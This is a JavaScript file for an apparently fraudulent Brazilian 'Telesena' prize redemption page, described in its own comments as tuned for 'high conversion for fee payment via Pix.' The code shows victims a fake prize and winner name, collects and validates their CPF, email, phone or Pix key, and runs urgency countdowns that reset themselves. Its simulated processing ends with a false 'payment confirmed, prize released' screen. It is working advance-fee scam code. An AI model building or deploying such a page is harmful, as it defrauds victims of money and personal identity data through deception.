// Redemption Script - Telesena Prize Redemption Page
// Focused on high conversion for fee payment via Pix

// Global variables
let countdownInterval;
let paymentTimerInterval;
let currentPixKey = '';
let currentKeyType = 'cpf';

// Initialize page when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    initializePage();
    setupEventListeners();
    startCountdown();
    startPaymentTimer();
    populatePrizeData();
});

// Initialize page components
function initializePage() {
    // Set initial state
    updateConfirmButton();
    
    // Initialize FAQ toggles
    initializeFAQ();
    
    // Set default key type
    updateKeyType('cpf');
    
    // Add loading states
    addLoadingStates();
}

// Setup all event listeners
function setupEventListeners() {
    // Key type selector
    const keyTypeInputs = document.querySelectorAll('input[name="key-type"]');
    keyTypeInputs.forEach(input => {
        input.addEventListener('change', function() {
            updateKeyType(this.value);
        });
    });
    
    // Pix key input
    const pixKeyInput = document.getElementById('pix-key-input');
    if (pixKeyInput) {
        pixKeyInput.addEventListener('input', function() {
            validatePixKey(this.value);
        });
        
        pixKeyInput.addEventListener('blur', function() {
            validatePixKey(this.value);
        });
    }
    
    // Confirm payment button
    const confirmBtn = document.getElementById('confirm-payment-btn');
    if (confirmBtn) {
        confirmBtn.addEventListener('click', function() {
            if (!this.disabled) {
                processPayment();
            }
        });
    }
    
    // FAQ items
    const faqQuestions = document.querySelectorAll('.faq-question');
    faqQuestions.forEach(question => {
        question.addEventListener('click', function() {
            toggleFAQ(this.parentElement);
        });
    });
}

// Populate prize data from URL parameters or localStorage
function populatePrizeData() {
    try {
        // Try to get data from URL parameters first
        const urlParams = new URLSearchParams(window.location.search);
        const prizeValue = urlParams.get('prize') || 'R$ 2.500,00';
        const userName = urlParams.get('name') || 'João Silva Santos';
        const protocol = urlParams.get('protocol') || 'TSN-2025-001234';
        
        // Update prize display
        const prizeValueElement = document.getElementById('prize-value');
        if (prizeValueElement) {
            prizeValueElement.textContent = prizeValue.replace('R$ ', '');
        }
        
        const userNameElement = document.getElementById('user-name');
        if (userNameElement) {
            userNameElement.textContent = userName;
        }
        
        const protocolElement = document.getElementById('prize-protocol');
        if (protocolElement) {
            protocolElement.textContent = protocol;
        }
        
        // Set expiry date (30 days from now)
        const expiryDate = new Date();
        expiryDate.setDate(expiryDate.getDate() + 30);
        const expiryElement = document.getElementById('prize-expiry');
        if (expiryElement) {
            expiryElement.textContent = expiryDate.toLocaleDateString('pt-BR');
        }
        
    } catch (error) {
        console.log('Using default prize data');
    }
}

// Update key type and input placeholder
function updateKeyType(type) {
    currentKeyType = type;
    const input = document.getElementById('pix-key-input');
    const icon = document.getElementById('key-icon');
    
    if (!input || !icon) return;
    
    // Clear current value and validation
    input.value = '';
    currentPixKey = '';
    updateConfirmButton();
    clearValidation();
    
    // Update icon and placeholder based on type
    switch (type) {
        case 'cpf':
            icon.className = 'fas fa-id-card input-icon';
            input.placeholder = 'Digite seu CPF (000.000.000-00)';
            input.maxLength = 14;
            break;
        case 'email':
            icon.className = 'fas fa-envelope input-icon';
            input.placeholder = 'Digite seu e-mail (exemplo@email.com)';
            input.maxLength = 100;
            break;
        case 'phone':
            icon.className = 'fas fa-phone input-icon';
            input.placeholder = 'Digite seu celular (11) 99999-9999';
            input.maxLength = 15;
            break;
        case 'random':
            icon.className = 'fas fa-key input-icon';
            input.placeholder = 'Digite sua chave aleatória';
            input.maxLength = 100;
            break;
    }
}

// Validate Pix key based on type
function validatePixKey(value) {
    const validation = document.getElementById('key-validation');
    if (!validation) return false;
    
    let isValid = false;
    let message = '';
    
    if (!value.trim()) {
        clearValidation();
        updateConfirmButton();
        return false;
    }
    
    switch (currentKeyType) {
        case 'cpf':
            isValid = validateCPF(value);
            message = isValid ? '✓ CPF válido' : '✗ CPF inválido';
            break;
        case 'email':
            isValid = validateEmail(value);
            message = isValid ? '✓ E-mail válido' : '✗ E-mail inválido';
            break;
        case 'phone':
            isValid = validatePhone(value);
            message = isValid ? '✓ Telefone válido' : '✗ Telefone inválido';
            break;
        case 'random':
            isValid = validateRandomKey(value);
            message = isValid ? '✓ Chave válida' : '✗ Chave deve ter pelo menos 32 caracteres';
            break;
    }
    
    // Update validation display
    validation.textContent = message;
    validation.className = `input-validation ${isValid ? 'valid' : 'invalid'}`;
    
    // Store valid key
    if (isValid) {
        currentPixKey = value;
    } else {
        currentPixKey = '';
    }
    
    updateConfirmButton();
    return isValid;
}

// CPF validation
function validateCPF(cpf) {
    // Remove formatting
    cpf = cpf.replace(/[^\d]/g, '');
    
    // Check length
    if (cpf.length !== 11) return false;
    
    // Check for repeated digits
    if (/^(\d)\1{10}$/.test(cpf)) return false;
    
    // Validate check digits
    let sum = 0;
    for (let i = 0; i < 9; i++) {
        sum += parseInt(cpf.charAt(i)) * (10 - i);
    }
    let remainder = (sum * 10) % 11;
    if (remainder === 10 || remainder === 11) remainder = 0;
    if (remainder !== parseInt(cpf.charAt(9))) return false;
    
    sum = 0;
    for (let i = 0; i < 10; i++) {
        sum += parseInt(cpf.charAt(i)) * (11 - i);
    }
    remainder = (sum * 10) % 11;
    if (remainder === 10 || remainder === 11) remainder = 0;
    if (remainder !== parseInt(cpf.charAt(10))) return false;
    
    return true;
}

// Email validation
function validateEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email) && email.length >= 5;
}

// Phone validation
function validatePhone(phone) {
    const phoneRegex = /^\(?[1-9]{2}\)?\s?9?[0-9]{4}-?[0-9]{4}$/;
    const cleanPhone = phone.replace(/[^\d]/g, '');
    return phoneRegex.test(phone) && (cleanPhone.length === 10 || cleanPhone.length === 11);
}

// Random key validation
function validateRandomKey(key) {
    return key.length >= 32 && /^[a-zA-Z0-9\-]+$/.test(key);
}

// Clear validation message
function clearValidation() {
    const validation = document.getElementById('key-validation');
    if (validation) {
        validation.textContent = '';
        validation.className = 'input-validation';
    }
}

// Update confirm button state
function updateConfirmButton() {
    const confirmBtn = document.getElementById('confirm-payment-btn');
    if (!confirmBtn) return;
    
    const isValid = currentPixKey.length > 0;
    confirmBtn.disabled = !isValid;
    
    if (isValid) {
        confirmBtn.style.opacity = '1';
        confirmBtn.style.cursor = 'pointer';
    } else {
        confirmBtn.style.opacity = '0.6';
        confirmBtn.style.cursor = 'not-allowed';
    }
}

// Copy Pix code to clipboard
function copyPixCode() {
    const pixCodeInput = document.getElementById('pix-code');
    if (!pixCodeInput) return;
    
    // Select and copy the text
    pixCodeInput.select();
    pixCodeInput.setSelectionRange(0, 99999); // For mobile devices
    
    try {
        document.execCommand('copy');
        showNotification('Código Pix copiado!', 'success');
    } catch (err) {
        // Fallback for modern browsers
        navigator.clipboard.writeText(pixCodeInput.value).then(() => {
            showNotification('Código Pix copiado!', 'success');
        }).catch(() => {
            showNotification('Erro ao copiar código', 'error');
        });
    }
}

// Process payment simulation
function processPayment() {
    if (!currentPixKey) {
        showNotification('Por favor, informe sua chave Pix', 'error');
        return;
    }
    
    // Show loading
    showLoading('Processando pagamento...', 'Aguarde enquanto confirmamos seu pagamento');
    
    // Simulate payment processing
    setTimeout(() => {
        // Update loading message
        updateLoading('Validando dados...', 'Verificando informações bancárias');
        
        setTimeout(() => {
            // Update loading message again
            updateLoading('Liberando prêmio...', 'Preparando transferência do prêmio');
            
            setTimeout(() => {
                // Hide loading and show success
                hideLoading();
                showSuccessSection();
                
                // Show success notification
                showNotification('Pagamento confirmado com sucesso!', 'success');
                
                // Scroll to success section
                document.getElementById('success-section').scrollIntoView({
                    behavior: 'smooth'
                });
                
            }, 2000);
        }, 2000);
    }, 3000);
}

// Show success section
function showSuccessSection() {
    // Hide payment section
    const paymentSection = document.getElementById('payment-section');
    if (paymentSection) {
        paymentSection.style.display = 'none';
    }
    
    // Show success section
    const successSection = document.getElementById('success-section');
    if (successSection) {
        successSection.style.display = 'block';
        
        // Populate success data
        const successPrize = document.getElementById('success-prize');
        const successPixKey = document.getElementById('success-pix-key');
        const successProtocol = document.getElementById('success-protocol');
        
        if (successPrize) {
            const prizeValue = document.getElementById('prize-value');
            successPrize.textContent = prizeValue ? `R$ ${prizeValue.textContent}` : 'R$ 2.500,00';
        }
        
        if (successPixKey) {
            // Mask the Pix key for privacy
            let maskedKey = currentPixKey;
            if (currentKeyType === 'cpf') {
                maskedKey = maskedKey.replace(/(\d{3})\d{3}(\d{3})/, '$1***$2');
            } else if (currentKeyType === 'email') {
                const [user, domain] = maskedKey.split('@');
                maskedKey = `${user.substring(0, 2)}***@${domain}`;
            } else if (currentKeyType === 'phone') {
                maskedKey = maskedKey.replace(/(\d{2})\d{5}(\d{4})/, '$1*****$2');
            } else {
                maskedKey = `${maskedKey.substring(0, 8)}***${maskedKey.substring(maskedKey.length - 4)}`;
            }
            successPixKey.textContent = maskedKey;
        }
        
        if (successProtocol) {
            // Generate a liberation protocol
            const timestamp = Date.now().toString().slice(-6);
            successProtocol.textContent = `TSN-LIB-2025-${timestamp}`;
        }
    }
    
    // Stop timers
    if (countdownInterval) clearInterval(countdownInterval);
    if (paymentTimerInterval) clearInterval(paymentTimerInterval);
}

// Countdown timer for urgency
function startCountdown() {
    let hours = 23;
    let minutes = 59;
    let seconds = 59;
    
    countdownInterval = setInterval(() => {
        seconds--;
        
        if (seconds < 0) {
            seconds = 59;
            minutes--;
            
            if (minutes < 0) {
                minutes = 59;
                hours--;
                
                if (hours < 0) {
                    // Reset countdown
                    hours = 23;
                    minutes = 59;
                    seconds = 59;
                }
            }
        }
        
        // Update display
        const hoursElement = document.getElementById('hours');
        const minutesElement = document.getElementById('minutes');
        const secondsElement = document.getElementById('seconds');
        
        if (hoursElement) hoursElement.textContent = hours.toString().padStart(2, '0');
        if (minutesElement) minutesElement.textContent = minutes.toString().padStart(2, '0');
        if (secondsElement) secondsElement.textContent = seconds.toString().padStart(2, '0');
        
    }, 1000);
}

// Payment timer (15 minutes)
function startPaymentTimer() {
    let totalSeconds = 15 * 60; // 15 minutes
    
    paymentTimerInterval = setInterval(() => {
        totalSeconds--;
        
        if (totalSeconds <= 0) {
            // Reset timer
            totalSeconds = 15 * 60;
        }
        
        const minutes = Math.floor(totalSeconds / 60);
        const seconds = totalSeconds % 60;
        
        const timerElement = document.getElementById('payment-timer');
        if (timerElement) {
            timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }
        
    }, 1000);
}

// FAQ functionality
function initializeFAQ() {
    // Close all FAQ items initially
    const faqItems = document.querySelectorAll('.faq-item');
    faqItems.forEach(item => {
        item.classList.remove('active');
    });
}

function toggleFAQ(faqItem) {
    const isActive = faqItem.classList.contains('active');
    
    // Close all FAQ items
    document.querySelectorAll('.faq-item').forEach(item => {
        item.classList.remove('active');
    });
    
    // Open clicked item if it wasn't active
    if (!isActive) {
        faqItem.classList.add('active');
    }
}

// Loading functionality
function showLoading(title, message) {
    const overlay = document.getElementById('loading-overlay');
    const titleElement = document.getElementById('loading-title');
    const messageElement = document.getElementById('loading-message');
    
    if (overlay) overlay.style.display = 'flex';
    if (titleElement) titleElement.textContent = title;
    if (messageElement) messageElement.textContent = message;
}

function updateLoading(title, message) {
    const titleElement = document.getElementById('loading-title');
    const messageElement = document.getElementById('loading-message');
    
    if (titleElement) titleElement.textContent = title;
    if (messageElement) messageElement.textContent = message;
}

function hideLoading() {
    const overlay = document.getElementById('loading-overlay');
    if (overlay) overlay.style.display = 'none';
}

// Notification system
function showNotification(message, type = 'info') {
    const notification = document.getElementById('notification');
    const messageElement = notification.querySelector('.notification-message');
    const iconElement = notification.querySelector('.notification-icon');
    
    if (!notification || !messageElement || !iconElement) return;
    
    // Set message
    messageElement.textContent = message;
    
    // Set icon and class based on type
    notification.className = `notification ${type}`;
    
    switch (type) {
        case 'success':
            iconElement.className = 'fas fa-check-circle notification-icon';
            break;
        case 'error':
            iconElement.className = 'fas fa-exclamation-circle notification-icon';
            break;
        case 'warning':
            iconElement.className = 'fas fa-exclamation-triangle notification-icon';
            break;
        default:
            iconElement.className = 'fas fa-info-circle notification-icon';
    }
    
    // Show notification
    notification.style.display = 'block';
    
    // Hide after 4 seconds
    setTimeout(() => {
        notification.style.display = 'none';
    }, 4000);
}

// Add loading states to interactive elements
function addLoadingStates() {
    // Add loading state to copy button
    const copyButton = document.querySelector('.copy-button');
    if (copyButton) {
        copyButton.addEventListener('click', function() {
            const originalText = this.innerHTML;
            this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Copiando...';
            this.disabled = true;
            
            setTimeout(() => {
                this.innerHTML = originalText;
                this.disabled = false;
            }, 1000);
        });
    }
}

// Input formatting
document.addEventListener('input', function(e) {
    const target = e.target;
    
    // Format CPF input
    if (target.id === 'pix-key-input' && currentKeyType === 'cpf') {
        let value = target.value.replace(/\D/g, '');
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
        target.value = value;
    }
    
    // Format phone input
    if (target.id === 'pix-key-input' && currentKeyType === 'phone') {
        let value = target.value.replace(/\D/g, '');
        value = value.replace(/(\d{2})(\d)/, '($1) $2');
        value = value.replace(/(\d{4,5})(\d{4})$/, '$1-$2');
        target.value = value;
    }
});

// Prevent form submission on Enter key
document.addEventListener('keypress', function(e) {
    if (e.key === 'Enter' && e.target.tagName !== 'BUTTON') {
        e.preventDefault();
        
        // If on Pix key input, validate and focus confirm button
        if (e.target.id === 'pix-key-input') {
            validatePixKey(e.target.value);
            const confirmBtn = document.getElementById('confirm-payment-btn');
            if (confirmBtn && !confirmBtn.disabled) {
                confirmBtn.focus();
            }
        }
    }
});

// Smooth scrolling for anchor links
document.addEventListener('click', function(e) {
    if (e.target.tagName === 'A' && e.target.getAttribute('href').startsWith('#')) {
        e.preventDefault();
        const targetId = e.target.getAttribute('href').substring(1);
        const targetElement = document.getElementById(targetId);
        
        if (targetElement) {
            targetElement.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    }
});

// Page visibility change handling
document.addEventListener('visibilitychange', function() {
    if (document.hidden) {
        // Page is hidden, pause timers if needed
        console.log('Page hidden');
    } else {
        // Page is visible, resume timers if needed
        console.log('Page visible');
    }
});

// Cleanup on page unload
window.addEventListener('beforeunload', function() {
    if (countdownInterval) clearInterval(countdownInterval);
    if (paymentTimerInterval) clearInterval(paymentTimerInterval);
});

// Expose global functions for HTML onclick handlers
window.copyPixCode = copyPixCode;

